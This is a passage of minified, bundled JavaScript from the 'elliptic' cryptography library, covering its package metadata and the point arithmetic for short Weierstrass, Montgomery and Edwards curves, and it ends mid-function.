"^1.4.3", coveralls: "^2.11.3", grunt: "^0.4.5", "grunt-browserify": "^5.0.0", "grunt-cli": "^1.2.0", "grunt-contrib-connect": "^1.0.0", "grunt-contrib-copy": "^1.0.0", "grunt-contrib-uglify": "^1.0.1", "grunt-mocha-istanbul": "^3.0.1", "grunt-saucelabs": "^8.6.2", istanbul: "^0.4.2", jscs: "^2.9.0", jshint: "^2.6.0", mocha: "^2.1.0" }, files: ["lib"], homepage: "https://github.com/indutny/elliptic", keywords: ["EC", "Elliptic", "curve", "Cryptography"], license: "MIT", main: "lib/elliptic.js", name: "elliptic", repository: { type: "git", url: "git+ssh://git@github.com/indutny/elliptic.git" }, scripts: { jscs: "jscs benchmarks/*.js lib/*.js lib/**/*.js lib/**/**/*.js test/index.js", jshint: "jscs benchmarks/*.js lib/*.js lib/**/*.js lib/**/**/*.js test/index.js", lint: "npm run jscs && npm run jshint", test: "npm run lint && npm run unit", unit: "istanbul test _mocha --reporter=spec test/index.js", version: "grunt dist && git add dist/" }, version: "6.4.0" } }, function(e, t, n) { "use strict";

    function i(e, t) { for (var n = [], i = 1 << t + 1, r = e.clone(); r.cmpn(1) >= 0;) { var o; if (r.isOdd()) { var a = r.andln(i - 1);
                o = a > (i >> 1) - 1 ? (i >> 1) - a : a, r.isubn(o) } else o = 0;
            n.push(o); for (var s = 0 !== r.cmpn(0) && 0 === r.andln(i - 1) ? t + 1 : 1, c = 1; c < s; c++) n.push(0);
            r.iushrn(s) } return n }

    function r(e, t) { var n = [
            [],
            []
        ];
        e = e.clone(), t = t.clone(); for (var i = 0, r = 0; e.cmpn(-i) > 0 || t.cmpn(-r) > 0;) { var o = e.andln(3) + i & 3,
                a = t.andln(3) + r & 3;
            3 === o && (o = -1), 3 === a && (a = -1); var s; if (0 == (1 & o)) s = 0;
            else { var c = e.andln(7) + i & 7;
                s = 3 !== c && 5 !== c || 2 !== a ? o : -o } n[0].push(s); var u; if (0 == (1 & a)) u = 0;
            else { var c = t.andln(7) + r & 7;
                u = 3 !== c && 5 !== c || 2 !== o ? a : -a } n[1].push(u), 2 * i === s + 1 && (i = 1 - i), 2 * r === u + 1 && (r = 1 - r), e.iushrn(1), t.iushrn(1) } return n }

    function o(e, t, n) { var i = "_" + t;
        e.prototype[t] = function() { return void 0 !== this[i] ? this[i] : this[i] = n.call(this) } }

    function a(e) { return "string" == typeof e ? c.toArray(e, "hex") : e }

    function s(e) { return new u(e, "hex", "le") } var c = t,
        u = n(3),
        l = n(5),
        d = n(58);
    c.assert = l, c.toArray = d.toArray, c.zero2 = d.zero2, c.toHex = d.toHex, c.encode = d.encode, c.getNAF = i, c.getJSF = r, c.cachedProperty = o, c.parseBytes = a, c.intFromLE = s }, function(e, t, n) { "use strict";

    function i(e, t) { this.type = e, this.p = new o(t.p, 16), this.red = t.prime ? o.red(t.prime) : o.mont(this.p), this.zero = new o(0).toRed(this.red), this.one = new o(1).toRed(this.red), this.two = new o(2).toRed(this.red), this.n = t.n && new o(t.n, 16), this.g = t.g && this.pointFromJSON(t.g, t.gRed), this._wnafT1 = new Array(4), this._wnafT2 = new Array(4), this._wnafT3 = new Array(4), this._wnafT4 = new Array(4); var n = this.n && this.p.div(this.n);!n || n.cmpn(100) > 0 ? this.redN = null : (this._maxwellTrick = !0, this.redN = this.n.toRed(this.red)) }

    function r(e, t) { this.curve = e, this.type = t, this.precomputed = null } var o = n(3),
        a = n(4),
        s = a.utils,
        c = s.getNAF,
        u = s.getJSF,
        l = s.assert;
    e.exports = i, i.prototype.point = function() { throw new Error("Not implemented") }, i.prototype.validate = function() { throw new Error("Not implemented") }, i.prototype._fixedNafMul = function(e, t) { l(e.precomputed); var n = e._getDoubles(),
            i = c(t, 1),
            r = (1 << n.step + 1) - (n.step % 2 == 0 ? 2 : 1);
        r /= 3; for (var o = [], a = 0; a < i.length; a += n.step) { for (var s = 0, t = a + n.step - 1; t >= a; t--) s = (s << 1) + i[t];
            o.push(s) } for (var u = this.jpoint(null, null, null), d = this.jpoint(null, null, null), f = r; f > 0; f--) { for (var a = 0; a < o.length; a++) { var s = o[a];
                s === f ? d = d.mixedAdd(n.points[a]) : s === -f && (d = d.mixedAdd(n.points[a].neg())) } u = u.add(d) } return u.toP() }, i.prototype._wnafMul = function(e, t) { var n = 4,
            i = e._getNAFPoints(n);
        n = i.wnd; for (var r = i.points, o = c(t, n), a = this.jpoint(null, null, null), s = o.length - 1; s >= 0; s--) { for (var t = 0; s >= 0 && 0 === o[s]; s--) t++; if (s >= 0 && t++, a = a.dblp(t), s < 0) break; var u = o[s];
            l(0 !== u), a = "affine" === e.type ? u > 0 ? a.mixedAdd(r[u - 1 >> 1]) : a.mixedAdd(r[-u - 1 >> 1].neg()) : u > 0 ? a.add(r[u - 1 >> 1]) : a.add(r[-u - 1 >> 1].neg()) } return "affine" === e.type ? a.toP() : a }, i.prototype._wnafMulAdd = function(e, t, n, i, r) { for (var o = this._wnafT1, a = this._wnafT2, s = this._wnafT3, l = 0, d = 0; d < i; d++) { var f = t[d],
                h = f._getNAFPoints(e);
            o[d] = h.wnd, a[d] = h.points } for (var d = i - 1; d >= 1; d -= 2) { var p = d - 1,
                b = d; if (1 === o[p] && 1 === o[b]) { var m = [t[p], null, null, t[b]];
                0 === t[p].y.cmp(t[b].y) ? (m[1] = t[p].add(t[b]), m[2] = t[p].toJ().mixedAdd(t[b].neg())) : 0 === t[p].y.cmp(t[b].y.redNeg()) ? (m[1] = t[p].toJ().mixedAdd(t[b]), m[2] = t[p].add(t[b].neg())) : (m[1] = t[p].toJ().mixedAdd(t[b]), m[2] = t[p].toJ().mixedAdd(t[b].neg())); var g = [-3, -1, -5, -7, 0, 7, 5, 1, 3],
                    v = u(n[p], n[b]);
                l = Math.max(v[0].length, l), s[p] = new Array(l), s[b] = new Array(l); for (var y = 0; y < l; y++) { var w = 0 | v[0][y],
                        x = 0 | v[1][y];
                    s[p][y] = g[3 * (w + 1) + (x + 1)], s[b][y] = 0, a[p] = m } } else s[p] = c(n[p], o[p]), s[b] = c(n[b], o[b]), l = Math.max(s[p].length, l), l = Math.max(s[b].length, l) } for (var S = this.jpoint(null, null, null), _ = this._wnafT4, d = l; d >= 0; d--) { for (var k = 0; d >= 0;) { for (var C = !0, y = 0; y < i; y++) _[y] = 0 | s[y][d], 0 !== _[y] && (C = !1); if (!C) break;
                k++, d-- } if (d >= 0 && k++, S = S.dblp(k), d < 0) break; for (var y = 0; y < i; y++) { var f, A = _[y];
                0 !== A && (A > 0 ? f = a[y][A - 1 >> 1] : A < 0 && (f = a[y][-A - 1 >> 1].neg()), S = "affine" === f.type ? S.mixedAdd(f) : S.add(f)) } } for (var d = 0; d < i; d++) a[d] = null; return r ? S : S.toP() }, i.BasePoint = r, r.prototype.eq = function() { throw new Error("Not implemented") }, r.prototype.validate = function() { return this.curve.validate(this) }, i.prototype.decodePoint = function(e, t) { e = s.toArray(e, t); var n = this.p.byteLength(); if ((4 === e[0] || 6 === e[0] || 7 === e[0]) && e.length - 1 == 2 * n) { 6 === e[0] ? l(e[e.length - 1] % 2 == 0) : 7 === e[0] && l(e[e.length - 1] % 2 == 1); return this.point(e.slice(1, 1 + n), e.slice(1 + n, 1 + 2 * n)) } if ((2 === e[0] || 3 === e[0]) && e.length - 1 === n) return this.pointFromX(e.slice(1, 1 + n), 3 === e[0]); throw new Error("Unknown point format") }, r.prototype.encodeCompressed = function(e) { return this.encode(e, !0) }, r.prototype._encode = function(e) { var t = this.curve.p.byteLength(),
            n = this.getX().toArray("be", t); return e ? [this.getY().isEven() ? 2 : 3].concat(n) : [4].concat(n, this.getY().toArray("be", t)) }, r.prototype.encode = function(e, t) { return s.encode(this._encode(t), e) }, r.prototype.precompute = function(e) { if (this.precomputed) return this; var t = { doubles: null, naf: null, beta: null }; return t.naf = this._getNAFPoints(8), t.doubles = this._getDoubles(4, e), t.beta = this._getBeta(), this.precomputed = t, this }, r.prototype._hasDoubles = function(e) { if (!this.precomputed) return !1; var t = this.precomputed.doubles; return !!t && t.points.length >= Math.ceil((e.bitLength() + 1) / t.step) }, r.prototype._getDoubles = function(e, t) { if (this.precomputed && this.precomputed.doubles) return this.precomputed.doubles; for (var n = [this], i = this, r = 0; r < t; r += e) { for (var o = 0; o < e; o++) i = i.dbl();
            n.push(i) } return { step: e, points: n } }, r.prototype._getNAFPoints = function(e) { if (this.precomputed && this.precomputed.naf) return this.precomputed.naf; for (var t = [this], n = (1 << e) - 1, i = 1 === n ? null : this.dbl(), r = 1; r < n; r++) t[r] = t[r - 1].add(i); return { wnd: e, points: t } }, r.prototype._getBeta = function() { return null }, r.prototype.dblp = function(e) { for (var t = this, n = 0; n < e; n++) t = t.dbl(); return t } }, function(e, t, n) { "use strict";

    function i(e) { l.call(this, "short", e), this.a = new c(e.a, 16).toRed(this.red), this.b = new c(e.b, 16).toRed(this.red), this.tinv = this.two.redInvm(), this.zeroA = 0 === this.a.fromRed().cmpn(0), this.threeA = 0 === this.a.fromRed().sub(this.p).cmpn(-3), this.endo = this._getEndomorphism(e), this._endoWnafT1 = new Array(4), this._endoWnafT2 = new Array(4) }

    function r(e, t, n, i) { l.BasePoint.call(this, e, "affine"), null === t && null === n ? (this.x = null, this.y = null, this.inf = !0) : (this.x = new c(t, 16), this.y = new c(n, 16), i && (this.x.forceRed(this.curve.red), this.y.forceRed(this.curve.red)), this.x.red || (this.x = this.x.toRed(this.curve.red)), this.y.red || (this.y = this.y.toRed(this.curve.red)), this.inf = !1) }

    function o(e, t, n, i) { l.BasePoint.call(this, e, "jacobian"), null === t && null === n && null === i ? (this.x = this.curve.one, this.y = this.curve.one, this.z = new c(0)) : (this.x = new c(t, 16), this.y = new c(n, 16), this.z = new c(i, 16)), this.x.red || (this.x = this.x.toRed(this.curve.red)), this.y.red || (this.y = this.y.toRed(this.curve.red)), this.z.red || (this.z = this.z.toRed(this.curve.red)), this.zOne = this.z === this.curve.one } var a = n(23),
        s = n(4),
        c = n(3),
        u = n(0),
        l = a.base,
        d = s.utils.assert;
    u(i, l), e.exports = i, i.prototype._getEndomorphism = function(e) { if (this.zeroA && this.g && this.n && 1 === this.p.modn(3)) { var t, n; if (e.beta) t = new c(e.beta, 16).toRed(this.red);
            else { var i = this._getEndoRoots(this.p);
                t = i[0].cmp(i[1]) < 0 ? i[0] : i[1], t = t.toRed(this.red) } if (e.lambda) n = new c(e.lambda, 16);
            else { var r = this._getEndoRoots(this.n);
                0 === this.g.mul(r[0]).x.cmp(this.g.x.redMul(t)) ? n = r[0] : (n = r[1], d(0 === this.g.mul(n).x.cmp(this.g.x.redMul(t)))) } var o; return o = e.basis ? e.basis.map(function(e) { return { a: new c(e.a, 16), b: new c(e.b, 16) } }) : this._getEndoBasis(n), { beta: t, lambda: n, basis: o } } }, i.prototype._getEndoRoots = function(e) { var t = e === this.p ? this.red : c.mont(e),
            n = new c(2).toRed(t).redInvm(),
            i = n.redNeg(),
            r = new c(3).toRed(t).redNeg().redSqrt().redMul(n); return [i.redAdd(r).fromRed(), i.redSub(r).fromRed()] }, i.prototype._getEndoBasis = function(e) { for (var t, n, i, r, o, a, s, u, l, d = this.n.ushrn(Math.floor(this.n.bitLength() / 2)), f = e, h = this.n.clone(), p = new c(1), b = new c(0), m = new c(0), g = new c(1), v = 0; 0 !== f.cmpn(0);) { var y = h.div(f);
            u = h.sub(y.mul(f)), l = m.sub(y.mul(p)); var w = g.sub(y.mul(b)); if (!i && u.cmp(d) < 0) t = s.neg(), n = p, i = u.neg(), r = l;
            else if (i && 2 == ++v) break;
            s = u, h = f, f = u, m = p, p = l, g = b, b = w } o = u.neg(), a = l; var x = i.sqr().add(r.sqr()); return o.sqr().add(a.sqr()).cmp(x) >= 0 && (o = t, a = n), i.negative && (i = i.neg(), r = r.neg()), o.negative && (o = o.neg(), a = a.neg()), [{ a: i, b: r }, { a: o, b: a }] }, i.prototype._endoSplit = function(e) { var t = this.endo.basis,
            n = t[0],
            i = t[1],
            r = i.b.mul(e).divRound(this.n),
            o = n.b.neg().mul(e).divRound(this.n),
            a = r.mul(n.a),
            s = o.mul(i.a),
            c = r.mul(n.b),
            u = o.mul(i.b); return { k1: e.sub(a).sub(s), k2: c.add(u).neg() } }, i.prototype.pointFromX = function(e, t) { e = new c(e, 16), e.red || (e = e.toRed(this.red)); var n = e.redSqr().redMul(e).redIAdd(e.redMul(this.a)).redIAdd(this.b),
            i = n.redSqrt(); if (0 !== i.redSqr().redSub(n).cmp(this.zero)) throw new Error("invalid point"); var r = i.fromRed().isOdd(); return (t && !r || !t && r) && (i = i.redNeg()), this.point(e, i) }, i.prototype.validate = function(e) { if (e.inf) return !0; var t = e.x,
            n = e.y,
            i = this.a.redMul(t),
            r = t.redSqr().redMul(t).redIAdd(i).redIAdd(this.b); return 0 === n.redSqr().redISub(r).cmpn(0) }, i.prototype._endoWnafMulAdd = function(e, t, n) { for (var i = this._endoWnafT1, r = this._endoWnafT2, o = 0; o < e.length; o++) { var a = this._endoSplit(t[o]),
                s = e[o],
                c = s._getBeta();
            a.k1.negative && (a.k1.ineg(), s = s.neg(!0)), a.k2.negative && (a.k2.ineg(), c = c.neg(!0)), i[2 * o] = s, i[2 * o + 1] = c, r[2 * o] = a.k1, r[2 * o + 1] = a.k2 } for (var u = this._wnafMulAdd(1, i, r, 2 * o, n), l = 0; l < 2 * o; l++) i[l] = null, r[l] = null; return u }, u(r, l.BasePoint), i.prototype.point = function(e, t, n) { return new r(this, e, t, n) }, i.prototype.pointFromJSON = function(e, t) { return r.fromJSON(this, e, t) }, r.prototype._getBeta = function() { if (this.curve.endo) { var e = this.precomputed; if (e && e.beta) return e.beta; var t = this.curve.point(this.x.redMul(this.curve.endo.beta), this.y); if (e) { var n = this.curve,
                    i = function(e) { return n.point(e.x.redMul(n.endo.beta), e.y) };
                e.beta = t, t.precomputed = { beta: null, naf: e.naf && { wnd: e.naf.wnd, points: e.naf.points.map(i) }, doubles: e.doubles && { step: e.doubles.step, points: e.doubles.points.map(i) } } } return t } }, r.prototype.toJSON = function() { return this.precomputed ? [this.x, this.y, this.precomputed && { doubles: this.precomputed.doubles && { step: this.precomputed.doubles.step, points: this.precomputed.doubles.points.slice(1) }, naf: this.precomputed.naf && { wnd: this.precomputed.naf.wnd, points: this.precomputed.naf.points.slice(1) } }] : [this.x, this.y] }, r.fromJSON = function(e, t, n) {
        function i(t) { return e.point(t[0], t[1], n) } "string" == typeof t && (t = JSON.parse(t)); var r = e.point(t[0], t[1], n); if (!t[2]) return r; var o = t[2]; return r.precomputed = { beta: null, doubles: o.doubles && { step: o.doubles.step, points: [r].concat(o.doubles.points.map(i)) }, naf: o.naf && { wnd: o.naf.wnd, points: [r].concat(o.naf.points.map(i)) } }, r }, r.prototype.inspect = function() { return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + ">" }, r.prototype.isInfinity = function() { return this.inf }, r.prototype.add = function(e) { if (this.inf) return e; if (e.inf) return this; if (this.eq(e)) return this.dbl(); if (this.neg().eq(e)) return this.curve.point(null, null); if (0 === this.x.cmp(e.x)) return this.curve.point(null, null); var t = this.y.redSub(e.y);
        0 !== t.cmpn(0) && (t = t.redMul(this.x.redSub(e.x).redInvm())); var n = t.redSqr().redISub(this.x).redISub(e.x),
            i = t.redMul(this.x.redSub(n)).redISub(this.y); return this.curve.point(n, i) }, r.prototype.dbl = function() { if (this.inf) return this; var e = this.y.redAdd(this.y); if (0 === e.cmpn(0)) return this.curve.point(null, null); var t = this.curve.a,
            n = this.x.redSqr(),
            i = e.redInvm(),
            r = n.redAdd(n).redIAdd(n).redIAdd(t).redMul(i),
            o = r.redSqr().redISub(this.x.redAdd(this.x)),
            a = r.redMul(this.x.redSub(o)).redISub(this.y); return this.curve.point(o, a) }, r.prototype.getX = function() { return this.x.fromRed() }, r.prototype.getY = function() { return this.y.fromRed() }, r.prototype.mul = function(e) { return e = new c(e, 16), this._hasDoubles(e) ? this.curve._fixedNafMul(this, e) : this.curve.endo ? this.curve._endoWnafMulAdd([this], [e]) : this.curve._wnafMul(this, e) }, r.prototype.mulAdd = function(e, t, n) { var i = [this, t],
            r = [e, n]; return this.curve.endo ? this.curve._endoWnafMulAdd(i, r) : this.curve._wnafMulAdd(1, i, r, 2) }, r.prototype.jmulAdd = function(e, t, n) { var i = [this, t],
            r = [e, n]; return this.curve.endo ? this.curve._endoWnafMulAdd(i, r, !0) : this.curve._wnafMulAdd(1, i, r, 2, !0) }, r.prototype.eq = function(e) { return this === e || this.inf === e.inf && (this.inf || 0 === this.x.cmp(e.x) && 0 === this.y.cmp(e.y)) }, r.prototype.neg = function(e) { if (this.inf) return this; var t = this.curve.point(this.x, this.y.redNeg()); if (e && this.precomputed) { var n = this.precomputed,
                i = function(e) { return e.neg() };
            t.precomputed = { naf: n.naf && { wnd: n.naf.wnd, points: n.naf.points.map(i) }, doubles: n.doubles && { step: n.doubles.step, points: n.doubles.points.map(i) } } } return t }, r.prototype.toJ = function() { return this.inf ? this.curve.jpoint(null, null, null) : this.curve.jpoint(this.x, this.y, this.curve.one) }, u(o, l.BasePoint), i.prototype.jpoint = function(e, t, n) { return new o(this, e, t, n) }, o.prototype.toP = function() { if (this.isInfinity()) return this.curve.point(null, null); var e = this.z.redInvm(),
            t = e.redSqr(),
            n = this.x.redMul(t),
            i = this.y.redMul(t).redMul(e); return this.curve.point(n, i) }, o.prototype.neg = function() { return this.curve.jpoint(this.x, this.y.redNeg(), this.z) }, o.prototype.add = function(e) { if (this.isInfinity()) return e; if (e.isInfinity()) return this; var t = e.z.redSqr(),
            n = this.z.redSqr(),
            i = this.x.redMul(t),
            r = e.x.redMul(n),
            o = this.y.redMul(t.redMul(e.z)),
            a = e.y.redMul(n.redMul(this.z)),
            s = i.redSub(r),
            c = o.redSub(a); if (0 === s.cmpn(0)) return 0 !== c.cmpn(0) ? this.curve.jpoint(null, null, null) : this.dbl(); var u = s.redSqr(),
            l = u.redMul(s),
            d = i.redMul(u),
            f = c.redSqr().redIAdd(l).redISub(d).redISub(d),
            h = c.redMul(d.redISub(f)).redISub(o.redMul(l)),
            p = this.z.redMul(e.z).redMul(s); return this.curve.jpoint(f, h, p) }, o.prototype.mixedAdd = function(e) { if (this.isInfinity()) return e.toJ(); if (e.isInfinity()) return this; var t = this.z.redSqr(),
            n = this.x,
            i = e.x.redMul(t),
            r = this.y,
            o = e.y.redMul(t).redMul(this.z),
            a = n.redSub(i),
            s = r.redSub(o); if (0 === a.cmpn(0)) return 0 !== s.cmpn(0) ? this.curve.jpoint(null, null, null) : this.dbl(); var c = a.redSqr(),
            u = c.redMul(a),
            l = n.redMul(c),
            d = s.redSqr().redIAdd(u).redISub(l).redISub(l),
            f = s.redMul(l.redISub(d)).redISub(r.redMul(u)),
            h = this.z.redMul(a); return this.curve.jpoint(d, f, h) }, o.prototype.dblp = function(e) { if (0 === e) return this; if (this.isInfinity()) return this; if (!e) return this.dbl(); if (this.curve.zeroA || this.curve.threeA) { for (var t = this, n = 0; n < e; n++) t = t.dbl(); return t } for (var i = this.curve.a, r = this.curve.tinv, o = this.x, a = this.y, s = this.z, c = s.redSqr().redSqr(), u = a.redAdd(a), n = 0; n < e; n++) { var l = o.redSqr(),
                d = u.redSqr(),
                f = d.redSqr(),
                h = l.redAdd(l).redIAdd(l).redIAdd(i.redMul(c)),
                p = o.redMul(d),
                b = h.redSqr().redISub(p.redAdd(p)),
                m = p.redISub(b),
                g = h.redMul(m);
            g = g.redIAdd(g).redISub(f); var v = u.redMul(s);
            n + 1 < e && (c = c.redMul(f)), o = b, s = v, u = g } return this.curve.jpoint(o, u.redMul(r), s) }, o.prototype.dbl = function() { return this.isInfinity() ? this : this.curve.zeroA ? this._zeroDbl() : this.curve.threeA ? this._threeDbl() : this._dbl() }, o.prototype._zeroDbl = function() { var e, t, n; if (this.zOne) { var i = this.x.redSqr(),
                r = this.y.redSqr(),
                o = r.redSqr(),
                a = this.x.redAdd(r).redSqr().redISub(i).redISub(o);
            a = a.redIAdd(a); var s = i.redAdd(i).redIAdd(i),
                c = s.redSqr().redISub(a).redISub(a),
                u = o.redIAdd(o);
            u = u.redIAdd(u), u = u.redIAdd(u), e = c, t = s.redMul(a.redISub(c)).redISub(u), n = this.y.redAdd(this.y) } else { var l = this.x.redSqr(),
                d = this.y.redSqr(),
                f = d.redSqr(),
                h = this.x.redAdd(d).redSqr().redISub(l).redISub(f);
            h = h.redIAdd(h); var p = l.redAdd(l).redIAdd(l),
                b = p.redSqr(),
                m = f.redIAdd(f);
            m = m.redIAdd(m), m = m.redIAdd(m), e = b.redISub(h).redISub(h), t = p.redMul(h.redISub(e)).redISub(m), n = this.y.redMul(this.z), n = n.redIAdd(n) } return this.curve.jpoint(e, t, n) }, o.prototype._threeDbl = function() { var e, t, n; if (this.zOne) { var i = this.x.redSqr(),
                r = this.y.redSqr(),
                o = r.redSqr(),
                a = this.x.redAdd(r).redSqr().redISub(i).redISub(o);
            a = a.redIAdd(a); var s = i.redAdd(i).redIAdd(i).redIAdd(this.curve.a),
                c = s.redSqr().redISub(a).redISub(a);
            e = c; var u = o.redIAdd(o);
            u = u.redIAdd(u), u = u.redIAdd(u), t = s.redMul(a.redISub(c)).redISub(u), n = this.y.redAdd(this.y) } else { var l = this.z.redSqr(),
                d = this.y.redSqr(),
                f = this.x.redMul(d),
                h = this.x.redSub(l).redMul(this.x.redAdd(l));
            h = h.redAdd(h).redIAdd(h); var p = f.redIAdd(f);
            p = p.redIAdd(p); var b = p.redAdd(p);
            e = h.redSqr().redISub(b), n = this.y.redAdd(this.z).redSqr().redISub(d).redISub(l); var m = d.redSqr();
            m = m.redIAdd(m), m = m.redIAdd(m), m = m.redIAdd(m), t = h.redMul(p.redISub(e)).redISub(m) } return this.curve.jpoint(e, t, n) }, o.prototype._dbl = function() { var e = this.curve.a,
            t = this.x,
            n = this.y,
            i = this.z,
            r = i.redSqr().redSqr(),
            o = t.redSqr(),
            a = n.redSqr(),
            s = o.redAdd(o).redIAdd(o).redIAdd(e.redMul(r)),
            c = t.redAdd(t);
        c = c.redIAdd(c); var u = c.redMul(a),
            l = s.redSqr().redISub(u.redAdd(u)),
            d = u.redISub(l),
            f = a.redSqr();
        f = f.redIAdd(f), f = f.redIAdd(f), f = f.redIAdd(f); var h = s.redMul(d).redISub(f),
            p = n.redAdd(n).redMul(i); return this.curve.jpoint(l, h, p) }, o.prototype.trpl = function() { if (!this.curve.zeroA) return this.dbl().add(this); var e = this.x.redSqr(),
            t = this.y.redSqr(),
            n = this.z.redSqr(),
            i = t.redSqr(),
            r = e.redAdd(e).redIAdd(e),
            o = r.redSqr(),
            a = this.x.redAdd(t).redSqr().redISub(e).redISub(i);
        a = a.redIAdd(a), a = a.redAdd(a).redIAdd(a), a = a.redISub(o); var s = a.redSqr(),
            c = i.redIAdd(i);
        c = c.redIAdd(c), c = c.redIAdd(c), c = c.redIAdd(c); var u = r.redIAdd(a).redSqr().redISub(o).redISub(s).redISub(c),
            l = t.redMul(u);
        l = l.redIAdd(l), l = l.redIAdd(l); var d = this.x.redMul(s).redISub(l);
        d = d.redIAdd(d), d = d.redIAdd(d); var f = this.y.redMul(u.redMul(c.redISub(u)).redISub(a.redMul(s)));
        f = f.redIAdd(f), f = f.redIAdd(f), f = f.redIAdd(f); var h = this.z.redAdd(a).redSqr().redISub(n).redISub(s); return this.curve.jpoint(d, f, h) }, o.prototype.mul = function(e, t) { return e = new c(e, t), this.curve._wnafMul(this, e) }, o.prototype.eq = function(e) { if ("affine" === e.type) return this.eq(e.toJ()); if (this === e) return !0; var t = this.z.redSqr(),
            n = e.z.redSqr(); if (0 !== this.x.redMul(n).redISub(e.x.redMul(t)).cmpn(0)) return !1; var i = t.redMul(this.z),
            r = n.redMul(e.z); return 0 === this.y.redMul(r).redISub(e.y.redMul(i)).cmpn(0) }, o.prototype.eqXToP = function(e) { var t = this.z.redSqr(),
            n = e.toRed(this.curve.red).redMul(t); if (0 === this.x.cmp(n)) return !0; for (var i = e.clone(), r = this.curve.redN.redMul(t);;) { if (i.iadd(this.curve.n), i.cmp(this.curve.p) >= 0) return !1; if (n.redIAdd(r), 0 === this.x.cmp(n)) return !0 } return !1 }, o.prototype.inspect = function() { return this.isInfinity() ? "<EC JPoint Infinity>" : "<EC JPoint x: " + this.x.toString(16, 2) + " y: " + this.y.toString(16, 2) + " z: " + this.z.toString(16, 2) + ">" }, o.prototype.isInfinity = function() { return 0 === this.z.cmpn(0) } }, function(e, t, n) { "use strict";

    function i(e) { c.call(this, "mont", e), this.a = new a(e.a, 16).toRed(this.red), this.b = new a(e.b, 16).toRed(this.red), this.i4 = new a(4).toRed(this.red).redInvm(), this.two = new a(2).toRed(this.red), this.a24 = this.i4.redMul(this.a.redAdd(this.two)) }

    function r(e, t, n) { c.BasePoint.call(this, e, "projective"), null === t && null === n ? (this.x = this.curve.one, this.z = this.curve.zero) : (this.x = new a(t, 16), this.z = new a(n, 16), this.x.red || (this.x = this.x.toRed(this.curve.red)), this.z.red || (this.z = this.z.toRed(this.curve.red))) } var o = n(23),
        a = n(3),
        s = n(0),
        c = o.base,
        u = n(4),
        l = u.utils;
    s(i, c), e.exports = i, i.prototype.validate = function(e) { var t = e.normalize().x,
            n = t.redSqr(),
            i = n.redMul(t).redAdd(n.redMul(this.a)).redAdd(t); return 0 === i.redSqrt().redSqr().cmp(i) }, s(r, c.BasePoint), i.prototype.decodePoint = function(e, t) { return this.point(l.toArray(e, t), 1) }, i.prototype.point = function(e, t) { return new r(this, e, t) }, i.prototype.pointFromJSON = function(e) { return r.fromJSON(this, e) }, r.prototype.precompute = function() {}, r.prototype._encode = function() { return this.getX().toArray("be", this.curve.p.byteLength()) }, r.fromJSON = function(e, t) { return new r(e, t[0], t[1] || e.one) }, r.prototype.inspect = function() { return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">" }, r.prototype.isInfinity = function() { return 0 === this.z.cmpn(0) }, r.prototype.dbl = function() { var e = this.x.redAdd(this.z),
            t = e.redSqr(),
            n = this.x.redSub(this.z),
            i = n.redSqr(),
            r = t.redSub(i),
            o = t.redMul(i),
            a = r.redMul(i.redAdd(this.curve.a24.redMul(r))); return this.curve.point(o, a) }, r.prototype.add = function() { throw new Error("Not supported on Montgomery curve") }, r.prototype.diffAdd = function(e, t) { var n = this.x.redAdd(this.z),
            i = this.x.redSub(this.z),
            r = e.x.redAdd(e.z),
            o = e.x.redSub(e.z),
            a = o.redMul(n),
            s = r.redMul(i),
            c = t.z.redMul(a.redAdd(s).redSqr()),
            u = t.x.redMul(a.redISub(s).redSqr()); return this.curve.point(c, u) }, r.prototype.mul = function(e) { for (var t = e.clone(), n = this, i = this.curve.point(null, null), r = this, o = []; 0 !== t.cmpn(0); t.iushrn(1)) o.push(t.andln(1)); for (var a = o.length - 1; a >= 0; a--) 0 === o[a] ? (n = n.diffAdd(i, r), i = i.dbl()) : (i = n.diffAdd(i, r), n = n.dbl()); return i }, r.prototype.mulAdd = function() { throw new Error("Not supported on Montgomery curve") }, r.prototype.jumlAdd = function() { throw new Error("Not supported on Montgomery curve") }, r.prototype.eq = function(e) { return 0 === this.getX().cmp(e.getX()) }, r.prototype.normalize = function() { return this.x = this.x.redMul(this.z.redInvm()), this.z = this.curve.one, this }, r.prototype.getX = function() { return this.normalize(), this.x.fromRed() } }, function(e, t, n) { "use strict";

    function i(e) { this.twisted = 1 != (0 | e.a), this.mOneA = this.twisted && -1 == (0 | e.a), this.extended = this.mOneA, u.call(this, "edwards", e), this.a = new s(e.a, 16).umod(this.red.m), this.a = this.a.toRed(this.red), this.c = new s(e.c, 16).toRed(this.red), this.c2 = this.c.redSqr(), this.d = new s(e.d, 16).toRed(this.red), this.dd = this.d.redAdd(this.d), l(!this.twisted || 0 === this.c.fromRed().cmpn(1)), this.oneC = 1 == (0 | e.c) }

    function r(e, t, n, i, r) { u.BasePoint.call(this, e, "projective"), null === t && null === n && null === i ? (this.x = this.curve.zero, this.y = this.curve.one, this.z = this.curve.one, this.t = this.curve.zero, this.zOne = !0) : (this.x = new s(t, 16), this.y = new s(n, 16), this.z = i ? new s(i, 16) : this.curve.one, this.t = r && new s(r, 16), this.x.red || (this.x = this.x.toRed(this.curve.red)), this.y.red || (this.y = this.y.toRed(this.curve.red)), this.z.red || (this.z = this.z.toRed(this.curve.red)), this.t && !this.t.red && (this.t = this.t.toRed(this.curve.red)), this.zOne = this.z === this.curve.one, this.curve.extended && !this.t && (this.t = this.x.redMul(this.y), this.zOne || (this.t = this.t.redMul(this.z.redInvm())))) } var o = n(23),
        a = n(4),
        s = n(3),
        c = n(0),
        u = o.base,
        l = a.utils.assert;
    c(i, u), e.exports = i, i.prototype._mulA = function(e) { return this.mOneA ? e.redNeg() : this.a.redMul(e) }, i.prototype._mulC = function(e) { return this.oneC ? e : this.c.redMul(e) }, i.prototype.jpoint = function(e, t, n, i) { return this.point(e, t, n, i) }, i.prototype.pointFromX = function(e, t) { e = new s(e, 16), e.red || (e = e.toRed(this.red)); var n = e.redSqr(),
            i = this.c2.redSub(this.a.redMul(n)),
            r = this.one.redSub(this.c2.redMul(this.d).redMul(n)),
            o = i.redMul(r.redInvm()),
            a = o.redSqrt(); if (0 !== a.redSqr().redSub(o).cmp(this.zero)) throw new Error("invalid point"); var c = a.fromRed().isOdd(); return (t && !c || !t && c) && (a = a.redNeg()), this.point(e, a) }, i.prototype.pointFromY = function(e, t) { e = new s(e, 16), e.red || (e = e.toRed(this.red)); var n = e.redSqr(),
            i = n.redSub(this.one),
